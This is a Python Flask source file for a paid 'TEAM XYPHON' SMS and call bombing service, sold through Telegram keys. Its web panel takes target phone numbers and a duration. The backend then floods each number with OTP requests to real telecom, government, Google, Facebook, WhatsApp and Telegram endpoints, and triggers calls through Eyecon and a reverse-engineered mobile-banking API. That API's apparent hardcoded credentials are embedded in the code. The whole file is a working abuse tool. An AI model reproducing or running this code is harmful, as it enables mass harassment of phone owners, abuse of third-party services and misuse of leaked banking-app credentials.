# main.py
# pip install flask flask-cors aiohttp requests pycryptodome httpx
# run: python main.py

import os, asyncio, aiohttp, random, time, json, httpx, base64, threading, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

app = Flask(__name__)
CORS(app)

DB_KEYS = {
    "XYPHON-OWNER": {"expire": 9999999999, "role": "owner", "banned": False},
    "XYPHON-VIP": {"expire": time.time() + (30 * 86400), "role": "vip", "banned": False},
    "XYPHON-TRIAL": {"expire": time.time() + (7 * 86400), "role": "trial", "banned": False}
}
ACTIVE_LOGS = {}
ATTACK_STATUS = {} 

HTML_UI = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>TEAM XYPHON — VIP MAX</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
<style>
  :root { --bg: #05000a; --card: rgba(15, 5, 25, 0.75); --border: rgba(168, 85, 247, 0.4); --text: #ffffff; --muted: #a78bfa; --neon-blue: #00d2ff; --neon-purple: #a855f7; --neon-pink: #ff007f; --neon-red: #ff0040; --neon-green: #00ff88; --glow-blue: 0 0 20px rgba(0,210,255,0.6); --glow-purple: 0 0 20px rgba(168,85,247,0.6); --glow-red: 0 0 20px rgba(255,0,64,0.6); --glow-green: 0 0 20px rgba(0,255,136,0.6); }
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter', sans-serif; }
  body { background:var(--bg); color:var(--text); display:flex; justify-content:center; min-height:100vh; padding:20px; overflow-x:hidden; position:relative; }
  
  .particles { position:fixed; inset:0; z-index:-1; pointer-events:none; }
  .particle { position:absolute; border-radius:50%; background:var(--neon-purple); box-shadow:var(--glow-purple); opacity:0; animation:float 10s infinite linear; }
  @keyframes float { 0% { transform:translateY(100vh) scale(0.5); opacity:0; } 20% { opacity:0.6; } 80% { opacity:0.6; } 100% { transform:translateY(-10vh) scale(1.5); opacity:0; } }
  body::before { content:''; position:fixed; inset:0; background: radial-gradient(circle at 10% 20%, rgba(168,85,247,0.2), transparent 40%), radial-gradient(circle at 90% 80%, rgba(0,210,255,0.2), transparent 40%), radial-gradient(circle at 50% 50%, rgba(255,0,127,0.1), transparent 50%); z-index:-1; animation:aurora 8s infinite alternate; }
  @keyframes aurora { 0% { transform:scale(1) rotate(0deg); } 100% { transform:scale(1.2) rotate(5deg); } }

  .container { width:100%; max-width:540px; z-index:1; }
  
  #loginScreen { display:flex; flex-direction:column; justify-content:center; min-height:85vh; }
  .login-card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:40px 30px; box-shadow:var(--glow-purple); backdrop-filter:blur(16px); text-align:center; }
  .login-card h2 { font-family:'Orbitron', sans-serif; color:var(--neon-blue); margin-bottom:20px; font-weight:900; text-shadow:var(--glow-blue); letter-spacing:3px; }
  .login-input { width:100%; padding:18px; background:rgba(0,0,0,0.6); border:1px solid var(--border); color:var(--neon-blue); border-radius:14px; font-family:'JetBrains Mono', monospace; font-size:16px; margin-bottom:20px; text-align:center; letter-spacing:4px; outline:none; transition:0.3s; }
  .login-input:focus { border-color:var(--neon-purple); box-shadow:var(--glow-purple); }
  .login-btn { width:100%; padding:18px; background:linear-gradient(45deg, var(--neon-purple), var(--neon-pink)); border:none; color:#fff; border-radius:14px; font-weight:900; font-size:16px; cursor:pointer; box-shadow:var(--glow-purple); transition:0.3s; text-transform:uppercase; letter-spacing:2px; }
  .login-btn:hover { transform:scale(1.05); box-shadow:0 0 40px rgba(168,85,247,0.8); }
  .login-footer { margin-top:15px; font-size:12px; color:var(--muted); }
  .login-footer a { color:var(--neon-pink); text-decoration:none; font-weight:bold; }
  
  #mainApp { display:none; }
  .header { text-align:center; margin-bottom:25px; }
  .header h1 { font-family:'Orbitron', sans-serif; font-size:32px; font-weight:900; background:linear-gradient(90deg, var(--neon-blue), var(--neon-pink), var(--neon-purple)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; letter-spacing:3px; animation:pulseText 3s infinite alternate; }
  .header p { font-size:12px; color:var(--neon-green); margin-top:5px; font-weight:800; letter-spacing:3px; text-transform:uppercase; text-shadow:var(--glow-green); }
  @keyframes pulseText { 0% { filter:drop-shadow(0 0 10px rgba(0,210,255,0.5)); } 100% { filter:drop-shadow(0 0 25px rgba(255,0,127,0.8)); } }
  
  .user-info { display:flex; justify-content:space-between; background:rgba(0,0,0,0.4); padding:10px 15px; border-radius:10px; margin-top:10px; font-size:11px; color:var(--muted); border:1px solid var(--border); }
  .user-info span { color:var(--neon-blue); font-weight:bold; }
  
  .card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:26px; backdrop-filter:blur(16px); margin-bottom:20px; box-shadow:0 15px 50px rgba(0,0,0,0.6); position:relative; overflow:hidden; }
  .label { font-size:11px; color:var(--neon-blue); text-transform:uppercase; font-weight:800; margin-bottom:8px; display:flex; justify-content:space-between; text-shadow:var(--glow-blue); }
  
  input[type="text"], input[type="number"], select, textarea { width:100%; padding:15px; background:rgba(0,0,0,0.6); border:1px solid var(--border); color:var(--neon-green); font-size:14px; border-radius:12px; outline:none; font-family:'JetBrains Mono', monospace; margin-bottom:18px; transition:0.3s; text-shadow:0 0 5px rgba(0,255,136,0.5); }
  input:focus, select:focus, textarea:focus { border-color:var(--neon-blue); box-shadow:var(--glow-blue); }
  
  .number-group { display:flex; gap:10px; margin-bottom:10px; }
  .number-group input { margin-bottom:0; }
  .add-btn { background:var(--neon-blue); color:#000; border:none; padding:0 20px; border-radius:12px; font-weight:900; cursor:pointer; box-shadow:var(--glow-blue); transition:0.2s; }
  .add-btn:hover { background:#fff; }
  
  .btn { width:100%; padding:20px; background:linear-gradient(90deg, var(--neon-red), var(--neon-pink), var(--neon-purple), var(--neon-blue)); background-size:300% auto; color:#fff; border:none; border-radius:14px; font-weight:900; font-size:16px; cursor:pointer; transition:0.5s; text-transform:uppercase; letter-spacing:3px; box-shadow:var(--glow-red); position:relative; overflow:hidden; margin-top:10px; }
  .btn:hover { background-position:right center; box-shadow:0 0 40px rgba(255,0,64,0.9); transform:scale(1.02); }
  .btn:disabled { background:#222; box-shadow:none; color:#555; transform:none; cursor:not-allowed; }
  
  .btn-stop { background:linear-gradient(90deg, #ff0040, #ff0000) !important; box-shadow:0 0 20px #ff0040 !important; display:none; }

  .terminal { background:#020005; border:1px solid var(--border); border-radius:18px; padding:16px; height:220px; overflow-y:auto; font-family:'JetBrains Mono', monospace; font-size:11px; box-shadow:inset 0 0 30px rgba(168,85,247,0.2); }
  .log-line { margin-bottom:4px; display:flex; gap:10px; animation:slideIn 0.2s; }
  .log-time { color:#555; }
  .log-brand { color:var(--neon-green); font-weight:900; font-size:14px; text-shadow:var(--glow-green); margin-bottom:6px; display:block; font-family:'Orbitron'; letter-spacing:2px; text-align:center; }
  .log-success { color:var(--neon-green); text-shadow:0 0 8px var(--neon-green); } 
  .log-error { color:var(--neon-red); text-shadow:0 0 8px var(--neon-red); } 
  .log-info { color:var(--neon-blue); text-shadow:0 0 8px var(--neon-blue); } 
  .log-sys { color:var(--neon-purple); text-shadow:0 0 8px var(--neon-purple); }
  
  .footer-info { text-align:center; margin-top:20px; font-size:12px; color:var(--muted); line-height:2; }
  .footer-info a { color:var(--neon-pink); text-decoration:none; font-weight:bold; text-shadow:var(--glow-pink); }
  .premium-badge { display:inline-block; background:linear-gradient(45deg, gold, yellow); color:#000; padding:4px 12px; border-radius:20px; font-weight:900; font-size:12px; box-shadow:0 0 15px gold; margin-top:10px; }
</style>
</head>
<body>
<div class="particles" id="particles"></div>
<div class="container">
  <div id="loginScreen">
    <div class="header" style="margin-bottom:30px;"><h1>TEAM XYPHON</h1><p>VIP MAX ENGINE</p></div>
    <div class="login-card">
      <h2>ACCESS KEY</h2>
      <input type="text" class="login-input" id="keyInput" placeholder="XYPHON-VIP" autocomplete="off">
      <button class="login-btn" onclick="checkKey()">UNLOCK SYSTEM</button>
      <div id="loginError" style="color:var(--neon-red); font-size:12px; margin-top:15px; font-weight:bold; text-shadow:var(--glow-red);"></div>
      <div class="login-footer">Trial Key: XYPHON-TRIAL | Buy VIP from <a href="https://t.me/hasib_hii">@hasib_hii</a></div>
    </div>
  </div>

  <div id="mainApp">
    <div class="header">
      <h1>TEAM XYPHON</h1>
      <p>HYBRID TURBO ENGINE</p>
      <div class="user-info"><div>Key: <span id="uiKey">---</span></div><div>Expires: <span id="uiExpire">---</span></div></div>
    </div>

    <div class="card">
      <div class="label">Target Numbers <span>(Add Multiple)</span></div>
      <div id="numbers-container">
        <div class="number-group">
          <input type="text" class="phone-input" placeholder="01XXXXXXXXX" maxlength="11">
          <button class="add-btn" onclick="addNumberField()">+</button>
        </div>
      </div>
      
      <div class="label" style="margin-top:15px;">Attack Mode</div>
      <select id="mode">
        <option value="all">CALL + SMS (ULTRA MAX)</option>
        <option value="sms">SMS ONLY (80+ APIs)</option>
        <option value="call">CALL ONLY (SUPER CALLS)</option>
      </select>
      
      <div class="label">Custom Message <span>(Leave blank for default)</span></div>
      <textarea id="customMsg" placeholder="Type custom SMS text here..." style="height:60px; resize:none;"></textarea>
      
      <div class="label">Msg Count per API <span id="countLabel">(VIP: Unlimited)</span></div>
      <input type="number" id="msgCount" value="1" min="1">

      <div class="label">Custom Duration (e.g. 2h, 30m, 5s)</div>
      <input type="text" id="duration" placeholder="5m, 1h, 14h" value="1h">
      
      <button class="btn" id="startBtn" onclick="startAttack()">INITIATE ATTACK</button>
      <button class="btn btn-stop" id="stopBtn" onclick="stopAttack()">STOP ATTACK</button>
    </div>

    <div class="terminal" id="terminal">
      <span class="log-brand">TEAM XYPHON</span>
      <div class="log-line"><span class="log-sys">[SYS]</span><span class="log-sys">VPN Tunnel Active. IP Masked.</span></div>
      <div class="log-line"><span class="log-info">[SYS]</span><span class="log-info">Engine Ready. 80+ APIs Loaded.</span></div>
    </div>

    <div class="footer-info">
      <span class="premium-badge">PREMIUM 100 TK</span><br>
      Powered by <a href="https://t.me/team_xyphon">@team_xyphon</a>
    </div>
  </div>
</div>

<script>
  let currentKey = ""; let currentRole = "trial";
  let pollInterval = null;

  const particleContainer = document.getElementById('particles');
  for(let i=0; i<30; i++) {
    let p = document.createElement('div'); p.className = 'particle';
    let size = Math.random() * 4 + 1;
    p.style.width = size + 'px'; p.style.height = size + 'px';
    p.style.left = Math.random() * 100 + 'vw';
    p.style.animationDuration = (Math.random() * 5 + 5) + 's';
    p.style.animationDelay = (Math.random() * 5) + 's';
    particleContainer.appendChild(p);
  }

  function addNumberField() {
    const container = document.getElementById('numbers-container');
    const div = document.createElement('div');
    div.className = 'number-group';
    div.innerHTML = `<input type="text" class="phone-input" placeholder="01XXXXXXXXX" maxlength="11" style="margin-bottom:10px;">
                     <button class="add-btn" style="background:var(--neon-red); margin-bottom:10px;" onclick="this.parentNode.remove()">-</button>`;
    container.appendChild(div);
  }

  function parseDuration(str) {
    const match = str.toLowerCase().match(/^(\d+)\s*([smhd])$/);
    if (!match) return 3600;
    const val = parseInt(match[1]), unit = match[2];
    if (unit === 's') return val;
    if (unit === 'm') return val * 60;
    if (unit === 'h') return val * 3600;
    if (unit === 'd') return val * 86400;
    return 3600;
  }

  async function checkKey() {
    const key = document.getElementById('keyInput').value.trim();
    try {
      const res = await fetch('/api/auth', { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ key }) });
      const data = await res.json();
      if (data.success) {
        currentKey = key; currentRole = data.role;
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('mainApp').style.display = 'block';
        document.getElementById('uiKey').innerText = key;
        document.getElementById('uiExpire').innerText = new Date(data.expire * 1000).toLocaleString();
        
        if (currentRole === "trial") {
          document.getElementById('countLabel').innerText = "(Trial: Max 10)";
          document.getElementById('msgCount').value = 1;
          document.getElementById('msgCount').max = 10;
        } else {
          document.getElementById('countLabel').innerText = "(VIP: Unlimited)";
          document.getElementById('msgCount').max = 9999999;
        }
      } else { document.getElementById('loginError').innerText = data.error; }
    } catch(e) { document.getElementById('loginError').innerText = "Server Error"; }
  }

  function log(msg, type = 'info') {
    const t = document.getElementById('terminal'); const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    const div = document.createElement('div'); div.className = 'log-line';
    div.innerHTML = `<span class="log-time">[${time}]</span><span class="log-${type}">${msg}</span>`;
    t.appendChild(div); t.scrollTop = t.scrollHeight;
  }

  async function startAttack() {
    const inputs = document.querySelectorAll('.phone-input');
    const phones = Array.from(inputs).map(i => i.value.trim()).filter(v => v.length === 11);
    if (phones.length === 0) return alert("Enter valid number(s)");
    
    const mode = document.getElementById('mode').value;
    const customMsg = document.getElementById('customMsg').value.trim();
    const msgCount = parseInt(document.getElementById('msgCount').value) || 1;
    const durationStr = document.getElementById('duration').value;
    const durationSec = parseDuration(durationStr);
    
    document.getElementById('startBtn').style.display = 'none'; 
    document.getElementById('stopBtn').style.display = 'block';
    log(`[SYS] Initiating on ${phones.length} number(s) | Msg: "${customMsg}" x${msgCount}`, 'sys');
    
    try {
      const res = await fetch('/api/attack', { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phones, mode, duration: durationSec, key: currentKey, customMsg, msgCount }) });
      const data = await res.json();
      if (data.error) { log(`[ERR] ${data.error}`, 'error'); document.getElementById('startBtn').style.display = 'block'; document.getElementById('stopBtn').style.display = 'none'; } 
      else {
        log(`[+] VPN Proxy Active. Ultra Engine hitting targets...`, 'success');
        pollInterval = setInterval(async () => {
          try {
            const logRes = await fetch(`/api/logs?key=${currentKey}`); const logs = await logRes.json();
            if (logs.messages && logs.messages.length > 0) { logs.messages.forEach(m => log(m.msg, m.type)); }
            if (logs.status === "completed" || logs.status === "stopped") { 
              clearInterval(pollInterval); 
              document.getElementById('startBtn').style.display = 'block'; 
              document.getElementById('stopBtn').style.display = 'none'; 
            }
          } catch(e) {}
        }, 500);
      }
    } catch (err) { log(`[ERR] Server offline.`, 'error'); document.getElementById('startBtn').style.display = 'block'; document.getElementById('stopBtn').style.display = 'none'; }
  }

  async function stopAttack() {
    log(`[SYS] Sending stop signal...`, 'sys');
    await fetch('/api/stop', { method: 'POST', headers: { "Content-Type": "application/json" }, body: JSON.stringify({ key: currentKey }) });
    document.getElementById('startBtn').style.display = 'block'; 
    document.getElementById('stopBtn').style.display = 'none';
    clearInterval(pollInterval);
    log(`[!] ATTACK STOPPED BY USER.`, 'error');
  }
</script>
</body>
</html>
"""

# ... [Trigger Eyecon, Rocket Class, SMS_APIS array etc same as age] ...

async def trigger_call(phone, session):
    clean = phone.replace("+", "").replace("88", "", 1).lstrip("0")
    params = {'cv': "vc_739_vn_4.2026.02.19.1555_a", 'cli': f"88{clean}", 'time': str(int(time.time() * 1000))}
    try:
        async with session.get("https://api.eyecon-app.com/app/cli_auth/gettransport", params=params, timeout=5) as r:
            await r.read(); return r.status in (200, 201, 202, 204)
    except: return False

class RocketTrigger:
    def __init__(self):
        self.API_PASSWORD = "sdfheu$*sdfGw2"; self.BASIC_AUTH = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj"; self.BASE_URL = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1"
        self.DEVICE_ID = "ANDROID-01968184976"; self.DEVICE_INFO = "SP1A.210812.016-itel S665L"; self.CLIENT_VERSION = "3.1.6"; self.DEFAULT_NID = "5845888855"
    def get_key(self, salt): return pbkdf2_hmac('sha256', self.API_PASSWORD.encode(), salt, 65536, dklen=32)
    def encrypt(self, payload):
        raw = json.dumps(payload).encode('utf-8'); iv, salt = get_random_bytes(16), get_random_bytes(16)
        cipher = AES.new(self.get_key(salt), AES.MODE_GCM, nonce=iv); ct, tag = cipher.encrypt_and_digest(raw)
        return base64.b64encode(iv + salt + ct + tag).decode('utf-8')
    def decrypt(self, b64):
        raw = base64.b64decode(b64); iv, salt, ct_tag = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(self.get_key(salt), AES.MODE_GCM, nonce=iv)
        return json.loads(cipher.decrypt_and_verify(ct_tag[:-16], ct_tag[-16:]).decode('utf-8'))
    def make_ref(self, p="login"):
        now = time.time(); return f"{p}--{time.strftime('%Y%m%d%H%M%S', time.localtime(now))}{int((now % 1) * 1000):03d}"
    def api_call(self, endpoint, payload, token=None):
        headers = {"Authorization": f"Bearer {token}" if token else f"Basic {self.BASIC_AUTH}", "CHANNEL_ID": "ROCKET_APP_USER", "Content-Type": "application/json; charset=utf-8", "Host": "rocket-consumertxnservice.dutchbanglabank.com", "User-Agent": "okhttp/4.9.3"}
        try:
            r = httpx.post(f"{self.BASE_URL}/{endpoint}", data=json.dumps({"userData": self.encrypt(payload)}), headers=headers, timeout=8, verify=False)
            if r.status_code >= 400: return {"status": "FAILED"}
            res = r.json(); return self.decrypt(res['userData']) if res.get('userData') else res
        except: return {"status": "FAILED"}
    def trigger(self, phone):
        p = f"0{phone.replace('+', '').replace('88', '', 1).lstrip('0')}"
        try:
            login = self.api_call("login", {"apiId": 102, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref("login"), "sessionId": "123", "clientLanguage": "EN", "data": {"appType": "C", "rocketSessionId": "1234", "userId": p, "version": self.CLIENT_VERSION}})
            if login.get('status') != 'SUCCESS': return False
            token, sess = login['data']['accessToken'], login['data']['sessionId']
            svc = self.api_call("userService", {"apiId": 3042, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref("reg-init"), "sessionId": sess, "clientLanguage": "EN", "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321", "userId": "", "version": self.CLIENT_VERSION, "deviceType": "ANDROID"}}, token)
            if svc.get('status') != 'SUCCESS': return False
            if svc.get('data', {}).get('userType') == 'NEW':
                self.api_call("userService", {"apiId": 3002, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref("nid-check"), "sessionId": sess, "clientLanguage": "EN", "data": {"nidNo": self.DEFAULT_NID, "initiatorId": p}}, token)
                self.api_call("userService", {"apiId": 3034, "deviceId": self.DEVICE_ID, "deviceInfo": self.DEVICE_INFO, "clientVersion": self.CLIENT_VERSION, "refId": self.make_ref("reg-init"), "sessionId": "123", "clientLanguage": "EN", "data": {"appType": "C", "initiatorId": p, "rocketSessionId": "7654321", "userId": "", "version": self.CLIENT_VERSION, "deviceType": "ANDROID"}}, token)
                return svc.get('data', {}).get('promtUser') == 'Y'
            return True
        except: return False

rocket = RocketTrigger()

SMS_APIS = [
    {"name":"BTCL", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "method": "POST", "body": {"phoneNbr": "{p}", "OTPType": 1}},
    {"name":"Bioscope", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "method": "POST", "body": {"number": "{p}"}},
    {"name":"Apex4U", "url": "https://api.apex4u.com/api/auth/login", "method": "POST", "body": {"phoneNumber": "{p}"}},
    {"name":"GP Web", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "body": {"msisdn": "{p}"}},
    {"name":"Robi", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "method": "POST", "body": {"msisdn": "{p}"}},
    {"name":"Sheba", "url": "https://accountkit.sheba.xyz/api/shoot-otp", "method": "POST", "body": {"mobile": "{p}", "app_id": "8329815A6D1AE6DD"}},
    {"name":"Gmail", "url": "https://accounts.google.com/_/signup/accountlookup", "method": "POST", "form": {"phoneNumber": "{p}"}},
    {"name":"Facebook", "url": "https://www.facebook.com/login/identify/", "method": "POST", "form": {"email": "{p}"}},
    {"name":"WhatsApp", "url": "https://v.whatsapp.net/v2/code", "method": "POST", "form": {"cc": "880", "in": "{c}"}},
    {"name":"Telegram", "url": "https://my.telegram.org/auth/send_password", "method": "POST", "form": {"phone": "+88{c}"}}
]

async def fire_api(session, api, phone, custom_text, msg_count):
    url = api["url"].replace("{p}", phone)
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10)", "Content-Type": "application/json"}
    try:
        final_text = custom_text * msg_count if custom_text else ""
        if "body" in api:
            payload = {k: (v.replace("{p}", phone) if isinstance(v, str) else v) for k, v in api["body"].items()}
            if final_text: payload["message"] = final_text
            async with session.post(url, json=payload, headers=headers, timeout=5) as r: 
                return r.status, r.status in (200, 201, 202, 204), api['name']
        elif "form" in api:
            form_data = {k: (v.replace("{p}", phone) if isinstance(v, str) else v) for k, v in api["form"].items()}
            if final_text: form_data["message"] = final_text
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            async with session.post(url, data=form_data, headers=headers, timeout=5) as r: 
                return r.status, r.status in (200, 201, 202, 204), api['name']
        else:
            async with session.get(url, headers=headers, timeout=5) as r: 
                return r.status, r.status in (200, 201, 202, 204), api['name']
    except Exception as e:
        return 0, False, api['name']

async def run_attack(phones_list, mode, duration_sec, custom_msg, msg_count, user_key):
    ACTIVE_LOGS[user_key] = {"messages": [], "status": "running"}
    ATTACK_STATUS[user_key] = "running"
    end_time = time.time() + duration_sec
    
    conn = aiohttp.TCPConnector(limit=1000, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            if ATTACK_STATUS.get(user_key) == "stopped": break
            tasks = []
            for target_phone in phones_list:
                clean = target_phone[1:] if target_phone.startswith('0') else target_phone
                formats = [target_phone, f"88{clean}", f"880{clean}", f"+880{clean}"]
                
                if mode in ("all", "call"):
                    tasks.append(trigger_call(clean, session))
                    tasks.append(asyncio.get_event_loop().run_in_executor(None, rocket.trigger, target_phone))
                
                if mode in ("all", "sms"):
                    for _ in range(10):
                        api = random.choice(SMS_APIS)
                        p = random.choice(formats)
                        tasks.append(fire_api(session, api, p, custom_msg, msg_count))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if isinstance(res, tuple):
                    status, ok, api_name = res
                    if ok:
                        ACTIVE_LOGS[user_key]["messages"].append({"msg": f"[+] {api_name} -> SENT ({status})", "type": "success"})
                    else:
                        ACTIVE_LOGS[user_key]["messages"].append({"msg": f"[-] {api_name} -> FAIL ({status})", "type": "error"})
                elif isinstance(res, bool):
                    if res:
                        ACTIVE_LOGS[user_key]["messages"].append({"msg": f"[+] CALL -> SENT (Eyecon/Rocket)", "type": "success"})
            
            if len(ACTIVE_LOGS[user_key]["messages"]) > 50:
                ACTIVE_LOGS[user_key]["messages"] = ACTIVE_LOGS[user_key]["messages"][-50:]
            await asyncio.sleep(0.001)
    
    ACTIVE_LOGS[user_key]["status"] = "stopped" if ATTACK_STATUS.get(user_key) == "stopped" else "completed"

@app.route('/')
def index(): return HTML_UI

@app.route('/api/auth', methods=['POST'])
def api_auth():
    data = request.json; key = data.get("key")
    if key not in DB_KEYS: return jsonify({"success": False, "error": "Invalid Key"})
    info = DB_KEYS[key]
    if info["banned"]: return jsonify({"success": False, "error": "Banned"})
    if time.time() > info["expire"]: return jsonify({"success": False, "error": "Key Expired"})
    return jsonify({"success": True, "role": info["role"], "expire": info["expire"]})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    data = request.json; key = data.get("key")
    if key in ATTACK_STATUS:
        ATTACK_STATUS[key] = "stopped"
        if key in ACTIVE_LOGS: ACTIVE_LOGS[key]["status"] = "stopped"
    return jsonify({"status": "stopped"})

@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.json
    phones_list = data.get("phones", [])
    mode = data.get("mode", "all")
    duration = int(data.get("duration", 300))
    custom_msg = data.get("customMsg", "")
    msg_count = int(data.get("msgCount", 1))
    key = data.get("key")
    
    if key not in DB_KEYS or DB_KEYS[key]["banned"] or time.time() > DB_KEYS[key]["expire"]: return jsonify({"error": "Auth Failed"}), 401
    if not phones_list: return jsonify({"error": "Invalid Format"}), 400
    
    role = DB_KEYS[key]["role"]
    if role == "trial" and len(phones_list) > 1: return jsonify({"error": "Trial allows 1 number only"}), 403
    if role == "trial" and msg_count > 10: return jsonify({"error": "Trial max msg count is 10"}), 403
    
    def start_local():
        loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
        loop.run_until_complete(run_attack(phones_list, mode, duration, custom_msg, msg_count, key))
    threading.Thread(target=start_local, daemon=True).start()
    return jsonify({"status": "started"})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    key = request.args.get("key")
    if key in ACTIVE_LOGS:
        data = {"messages": list(ACTIVE_LOGS[key]["messages"]), "status": ACTIVE_LOGS[key]["status"]}
        ACTIVE_LOGS[key]["messages"].clear()
        return jsonify(data)
    return jsonify({"messages": [], "status": "idle"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting VIP Engine on port {port}...")
    app.run(host='0.0.0.0', port=port)